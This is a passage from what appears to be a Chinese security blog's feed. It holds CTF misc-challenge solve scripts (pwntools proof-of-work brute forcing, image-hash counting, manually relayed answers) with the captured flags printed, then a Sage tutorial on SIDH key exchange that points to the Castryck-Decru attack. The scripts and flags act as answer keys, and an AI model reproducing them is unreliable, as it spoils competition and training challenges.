class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">20382</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;plaintext: &quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">26</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;md5_hex -&gt; &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">6</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, suffix+proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(b64decode(r.recvline().strip()))</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        box = (<span class="number">50</span>*i,<span class="number">50</span>*j,<span class="number">50</span>*(i+<span class="number">1</span>),<span class="number">50</span>*(j+<span class="number">1</span>))</span><br><span class="line">        region = im.crop(box)</span><br><span class="line">        region.save(<span class="string">&#x27;img/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">sample = [<span class="string">&#x27;d108ad1582e37a825d092131a55babcc&#x27;</span>, <span class="string">&#x27;9901603c7d2a5dde25723c9e569428da&#x27;</span>, <span class="string">&#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;</span>, <span class="string">&#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;</span>, <span class="string">&#x27;33ff92480ee08585d901ffd0a47de021&#x27;</span>, <span class="string">&#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;</span>, <span class="string">&#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;</span>, <span class="string">&#x27;4497c04cea4897727d88f7945bc86d77&#x27;</span>, <span class="string">&#x27;047fd19a9a30301444e11394ee99d8be&#x27;</span>, <span class="string">&#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;</span>, <span class="string">&#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;</span>, <span class="string">&#x27;109d33cf832c83ebebca8c4f165862a9&#x27;</span>, <span class="string">&#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;</span>, <span class="string">&#x27;121808a4d3f160f235f27cb77355d525&#x27;</span>, <span class="string">&#x27;b15356da578f67bac5a3d777913ce97d&#x27;</span>, <span class="string">&#x27;a174639d2070109e85ffb53657d5c9d5&#x27;</span>, <span class="string">&#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;</span>, <span class="string">&#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;</span>, <span class="string">&#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;</span>, <span class="string">&#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;</span>, <span class="string">&#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;</span>, <span class="string">&#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;</span>, <span class="string">&#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;</span>, <span class="string">&#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;</span>, <span class="string">&#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;</span>, <span class="string">&#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">    path = <span class="string">&#x27;img/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    x = md5(<span class="built_in">open</span>(path,<span class="string">&#x27;rb&#x27;</span>).read()).hexdigest()</span><br><span class="line">    m.append(x)</span><br><span class="line"></span><br><span class="line">res = Counter(m)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"></span><br><span class="line">out = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    out.append(res[sample[i]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(out).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).strip(<span class="string">&#x27;[&#x27;</span>).strip(<span class="string">&#x27;]&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Got it!</span><br><span class="line">flag&#123;d8b8a96466e21df8b45cce5ce875e95e&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="图片识别"><a href="#图片识别" class="headerlink" title="图片识别"></a>图片识别</h3><p>给定动物样本数据，判断随机抽取10次动物图片，输入动物名称，正确至少8次给flag，每次3s内输入。</p><p>数量较少，非预期直接按照图片手动判断在3s内快速输入即可。</p><p>半自动交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">28452</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;plaintext: &quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">26</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;md5_hex -&gt; &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">6</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, suffix+proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;animal.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(b64decode(r.recvline().strip()))</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&#x27;animal.png&#x27;</span>)</span><br><span class="line">    img.show()</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(raw_input(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h3><p>提供50封邮件内容的正常邮件/垃圾邮件分类，判断10封邮件内容属于哪种分类，全对给flag。</p><p>数量较少，非预期直接按照内容手动判断即可。</p><p>PoW部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">27218</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;sha256(&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">28</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;= &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;xxxx = &#x27;</span>, proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">51</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Press ENTER to continue... &#x27;</span>)</span><br><span class="line">    r.sendline()</span><br><span class="line">    </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>按内容手动判断输入H（正常邮件）或S（垃圾邮件），得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Good job! Just take it:</span><br><span class="line">flag&#123;da238e5ee5716136c6884c0b4a369093&#125;</span><br></pre></td></tr></table></figure><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;✌️竞赛时间：12月17日 10:00—12月18日 22:00&lt;br&gt;✌️得分规则：比赛采用动态分数制度 ，每道题目的分值将根据解出队伍的数量进行动态记分。&lt;br&gt;✌️题目类型：Web、Pwn、Reverse、Misc、Crypto等&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>后量子密码</title>
    <link href="https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"/>
    <id>https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/</id>
    <published>2022-12-16T14:04:27.000Z</published>
    <updated>2022-12-16T18:07:40.415Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p><strong>后量子密码学</strong>（Post-Quantum Cryptography，PQC），又称<strong>抗量子计算密码学</strong>，是密码学的一个研究领域，专门研究能够抵抗量子计算机的加密算法，特别是公钥加密（非对称加密）算法。不同于量子密码学，后量子密码学使用现有的电子计算机，不依靠量子力学，它依靠的是密码学家认为无法被量子计算机有效解决的计算难题。</p><p>在公钥加密方面，后量子密码学的研究方向包括了格密码学（Lattice-based Cryptography）、容错学习问题（LWE）、多变量密码学（英语：Multivariate Cryptography）、散列密码学（英语：Hash-based Cryptography）、编码密码学（Code-based Cryptography）与超奇异椭圆曲线同源密码学（Supersingular Isogeny Key Exchange）。密码学家认为，基于这些计算难题有望构建出不受量子计算机的威胁的公钥加密系统，替代现有的方案。</p><p>​    </p><h3 id="超奇异同源密钥交换（SIDH）"><a href="#超奇异同源密钥交换（SIDH）" class="headerlink" title="超奇异同源密钥交换（SIDH）"></a>超奇异同源密钥交换（SIDH）</h3><p>超奇异椭圆曲线同源密码学（Supersingular Elliptic Curve Isogeny Cryptography）是利用超奇异椭圆曲线（Supersingular Elliptic Curves）与超奇异同源图（Supersingular Isogeny Graphs）的数学性质的密码学，可以实现<strong>超奇异同源密钥交换</strong>（Supersingular Isogeny Key Exchange，<strong>SIKE</strong>）（协议为超奇异同源Diffie-Hellman密钥交换协议，<strong>SIDH</strong>），具有前向安全性。其使用方法和现有的Diffie-Hellman密钥交换相似，有望直接替代当前的常规椭圆曲线密钥交换（ECDH）。</p><p>Diffie-Hellman基本协议：</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/DH0.jpeg" alt="img"></p><p>抽象Diffie-Hellman：</p><p>Alice的秘密是 $a$，她的计算先做→，得到 $g^a$，再做↓，得到 $g^{ab}$。而Bob的秘密是 $b$，他先做↓，再做→。殊途同归得到 $g^{ab}$。</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/DH1.jpeg" alt="img"></p><h4 id="SIDH构造的简化版本"><a href="#SIDH构造的简化版本" class="headerlink" title="SIDH构造的简化版本"></a>SIDH构造的简化版本</h4><p>SIDH的基本代数结构是超奇异椭圆曲线群 $E$ 和超奇异同源（Isogeny）$\phi$。基本思路如下图所示：</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/SIDH-2.jpeg" alt="img" style="zoom: 67%;"></p><p>首先，超奇异椭圆曲线群 $E$ 理解为一个群。其次，构造用到的超奇异同源 $\phi : E \mapsto E’$ 是从群 $E$ 到群 $E’$ 的一种群同态。算法类似DH算法分为以下两个步骤：</p><ul><li>首先，Alice选取一个点 $R_A \in E$，$\langle R_A \rangle$ 确定了群 $E$ 的一个子群，然后可以计算得到一个从 $E$ 映射到其子群 $E_A$ 的同源 $\phi_A: E \mapsto E_A$，这是Alice的秘密信息。Alice发送公开信息 $E_A$ 给Bob。</li><li>同样，Bob选择点 $R_B\in E$，然后计算得到 $\phi_B: E \mapsto E_B$，把公开信息 $E_B$ 发送给Alice。</li></ul><p>最终Alice算出 $E/\langle R_B, R_A \rangle$，Bob算出 $E/\langle R_A, R_B \rangle$。上图中的 $E/\langle R_A \rangle$ 和 $E/\langle R_B \rangle$ 分别是 $E_A$ 和 $E_B$，这样表达是为了与之前的表达一致，其实这里并不是做商群，而是表达说 $\phi_A$ 的Kernel是 $\langle R_A \rangle$。目前的科技文献大多使用这种表达。</p><p>上面说到，$E_A$ 是曲线群 $E$ 的子群，它由同源 $\phi_A$ 决定，可理解为群同态 $\phi_A$ 映射到 $E$ 上的像 (Image)形成的子群。同理，$E_{BA}$ 是同源 $\phi_{BA}$ 映射到 $E$ 上的子群，而同源 $\phi_{BA}$ 是由 $\langle R_B, R_A \rangle$ 决定的，即同源 $\phi_{BA}$ 的Kernel是 $\langle R_B, R_A \rangle$。</p><h4 id="SIDH构造的细化版本"><a href="#SIDH构造的细化版本" class="headerlink" title="SIDH构造的细化版本"></a>SIDH构造的细化版本</h4><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/SIDH-3.jpeg" alt="img" style="zoom:67%;"></p><p>为了满足Alice在没有Bob的秘密信息的情况下能计算出 $E_{BA}$ 的要求，SIDH需要使用更多的参数设计和相关计算。算法增加描述如下：</p><h5 id="SIDH参数设计"><a href="#SIDH参数设计" class="headerlink" title="SIDH参数设计"></a>SIDH参数设计</h5><p>首先，选择超奇异椭圆曲线 $E$ 作为公开参数。然后Alice随机选择两个元素 $P_A, Q_A \in E$，并公开作为自己的公共参数。同样，Bob也随机选择两个元素 $P_B, Q_B \in E$ 并公开。</p><h5 id="Alice的操作"><a href="#Alice的操作" class="headerlink" title="Alice的操作"></a>Alice的操作</h5><ul><li>随机选择两个整数 $s_A$ 和 $t_A$ 作为秘密信息，计算 $R_A = s_A P_A + t_A Q_A\in E$，并由 $R_A$ 计算得到一个从 $E$ 映射到其子群 $E_A$ 的同源 $\phi_A: E \mapsto E_A$，这也是Alice的秘密信息；</li><li>获取Bob的公开信息，并计算 $\phi_A(P_B)$ 和 $\phi_A(Q_B)$，这些是公开信息；</li><li>Alice发送公开信息 $E_A$、$\phi_A(P_B)$ 和 $\phi_A(Q_B)$ 给Bob。</li></ul><h5 id="Bob的操作"><a href="#Bob的操作" class="headerlink" title="Bob的操作"></a>Bob的操作</h5><ul><li>随机选择两个整数 $s_B$ 和 $t_B$ 作为秘密信息，计算 $R_B = s_B P_B + t_B Q_B\in E$，并由 $R_B$ 计算得到一个从 $E$ 映射到其子群 $E_B$ 的同源 $\phi_B: E \mapsto E_B$，这也是Bob的秘密信息；</li><li>获取Alice的公开信息，并计算 $\phi_B(P_A)$ 和 $\phi_B(Q_A)$，这些是公开信息；</li><li>Bob发送公开信息 $E_B$、$\phi_B(P_A)$ 和 $\phi_B(Q_A)$ 给Alice。</li></ul><h5 id="秘密值的计算"><a href="#秘密值的计算" class="headerlink" title="秘密值的计算"></a>秘密值的计算</h5><p>Alice计算子群 $E_{BA}$ ，方法如下：</p><ul><li>注意，此时Alice掌握的信息是 $s_A$、$t_A$、$R_A$、$\phi_B(P_A)$ 和 $\phi_B(Q_A)$，她想计算得到 $\phi_B(R_A)$。并且要强调，$\phi_B$ 是一种群同态。</li><li>利用群同态的属性可计算得到：$\phi_B(R_A) = \phi_B(s_A P_A + t_A Q_A) = s_A \phi_B(P_A) + t_A \phi_B(Q_A)$ 。</li><li>根据 $\phi_B(R_A)$ 计算 $E_{BA}$。$E_{BA}$是曲线群 $E$ 的子群，是以 $\phi_B (R_A)$ 为Kernel的群同态映射到 $E$ 上的子群。这个群同态也就是Isogeny，这个Isogeny记为 $\phi_{BA}$ 。</li></ul><p>类似的，Bob可以计算子群 $E_{AB}$：</p><ul><li>$\phi_A(R_B) = s_B \phi_A(P_B) + t_B \phi_A(Q_B)$；</li><li>由此可计算得 $E_{AB}$ ；</li></ul><p>最后冲顶的一步，计算秘密值。首先要明确，很可能 $E_{BA} \ne E_{AB}$，但是，$E_{BA}$ 同构于 $E_{AB}$。利用同构曲线的一个属性：所有同构曲线的J-Invariant值相同。于是Alice和Bob分别计算这两条曲线的J-Invariant值 $J(E_{BA})$ 和 $J(E_{AB})$，这就是他们共同拥有的秘密。J-Invariant的计算定义可在标准教科书中找到，本文把它视为黑盒子使用。</p><h4 id="Sage代码"><a href="#Sage代码" class="headerlink" title="Sage代码"></a>Sage代码</h4><p><strong>参数设置</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#选取一条在素域k上的超奇异椭圆曲线</span></span><br><span class="line">lA, lB = <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">eA, eB = <span class="number">6</span>, <span class="number">7</span></span><br><span class="line">p = lA ^ eA * lB ^ eB - <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p.is_prime()</span><br><span class="line"><span class="keyword">assert</span> p % <span class="number">4</span> == <span class="number">3</span></span><br><span class="line">k = GF(p) <span class="comment"># 注意，这里并不是标准做法，只是因为Sage的局限不得已</span></span><br><span class="line">E = EllipticCurve(k, [<span class="number">1</span>, <span class="number">0</span>]) <span class="comment">#选取曲线</span></span><br><span class="line">E</span><br><span class="line">E.is_supersingular() <span class="comment"># 看看所生成的曲线是否超奇异.</span></span><br><span class="line"><span class="built_in">print</span>(E.j_invariant())</span><br><span class="line"></span><br><span class="line"><span class="comment">#选取四个随机点作为公共参数</span></span><br><span class="line">points = []</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(points) != <span class="number">4</span>:</span><br><span class="line">    p = E.random_point()</span><br><span class="line">    <span class="keyword">if</span> p <span class="keyword">not</span> <span class="keyword">in</span> points:</span><br><span class="line">        points.append(p)</span><br><span class="line">PA, PB, QA, QB = points</span><br><span class="line">PA, PB, QA, QB</span><br></pre></td></tr></table></figure><p><strong>Alice 的操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Alice选择两个随机数并计算自己的秘密值RA</span></span><br><span class="line"><span class="comment">#RA定义了phi_A的kernel</span></span><br><span class="line">sA, tA = <span class="number">123</span>, <span class="number">525</span></span><br><span class="line">RA = sA * PA + tA * QA</span><br><span class="line"><span class="built_in">print</span>(RA)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phiA就是同源也是群同态</span></span><br><span class="line">phiA = E.isogeny(RA)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Alice的公共信息EA</span></span><br><span class="line">EA = phiA.codomain()</span><br><span class="line"><span class="built_in">print</span>(E.is_isogenous(EA)) <span class="comment"># 确认EA与E同源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Alice发送以下信息给Bob</span></span><br><span class="line">EA, phiA_PB, phiA_QB = EA, phiA(PB), phiA(QB)</span><br><span class="line">EA, phiA_PB, phiA_QB</span><br></pre></td></tr></table></figure><p><strong>Bob 的操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Bob的工作类似</span></span><br><span class="line">sB, tB = <span class="number">812</span>, <span class="number">580</span></span><br><span class="line">RB = sB * PB + tB * QB</span><br><span class="line"><span class="built_in">print</span>(RB)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phiB就是从E到EB同态映射,Kernel是RB</span></span><br><span class="line">phiB = E.isogeny(RB)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Bob的公共信息EB</span></span><br><span class="line">EB = phiB.codomain()</span><br><span class="line"><span class="built_in">print</span>(E.is_isogenous(EB)) <span class="comment"># 确认EB与E同源</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bob发送以下信息给Alice</span></span><br><span class="line">EB, phiB_PA, phiB_QA = EB, phiB(PA), phiB(QA)</span><br><span class="line">EB, phiB_PA, phiB_QA</span><br></pre></td></tr></table></figure><p><strong>秘密值计算</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Alice计算秘密值</span></span><br><span class="line">R_BA = sA * phiB_PA + tA * phiB_QA</span><br><span class="line"><span class="built_in">print</span>(R_BA)</span><br><span class="line">phiBA = EB.isogeny(R_BA)</span><br><span class="line"><span class="built_in">print</span>(phiBA)</span><br><span class="line">KA = phiBA.codomain().j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bob计算秘密值</span></span><br><span class="line">R_AB = sB * phiA_PB + tB * phiA_QB</span><br><span class="line"><span class="built_in">print</span>(R_AB)</span><br><span class="line">phiAB = EA.isogeny(R_AB)</span><br><span class="line"><span class="built_in">print</span>(phiAB)</span><br><span class="line">KB = phiAB.codomain().j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试秘密值是否相等</span></span><br><span class="line"><span class="keyword">if</span> KA == KB:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success!&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Castryck-Decru攻击"><a href="#Castryck-Decru攻击" class="headerlink" title="Castryck-Decru攻击"></a>Castryck-Decru攻击</h4><p>参考：</p><p><a href="https://eprint.iacr.org/2022/975.pdf">An efficient key recovery attack on SIDH</a></p><p><a href="https://github.com/jack4818/Castryck-Decru-SageMath">Castryck-Decru Key Recovery Attack on SIDH</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后量子密码学&lt;/strong&gt;（Post-Quantum Cryptography，PQC），又称&lt;strong&gt;抗量子计算密码学&lt;/strong&gt;，是密码学的一个研究领域，专门研究能够抵抗量子计算机的加密算法，特别是公钥加密（非对</summary>
      
    
    
    
    <category term="crypto" scheme="https://lazzzaro.github.io/categories/crypto/"/>
    
    
    <category term="后量子密码" scheme="https://lazzzaro.github.io/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2022-公开赛</title>
    <link href="https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2022-11-18T11:43:08.000Z</published>
    <updated>2022-11-20T17:32:45.560Z</updated>
    
